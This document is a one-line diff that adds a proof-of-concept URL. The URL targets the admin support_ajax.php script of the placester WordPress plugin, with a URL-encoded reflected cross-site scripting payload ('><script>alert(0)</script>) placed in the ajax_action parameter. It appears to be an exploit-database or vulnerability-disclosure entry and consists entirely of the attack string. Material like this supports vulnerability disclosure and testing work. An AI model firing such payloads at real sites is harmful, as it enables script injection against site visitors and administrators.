@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/placester/admin/support_ajax.php?ajax_action=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
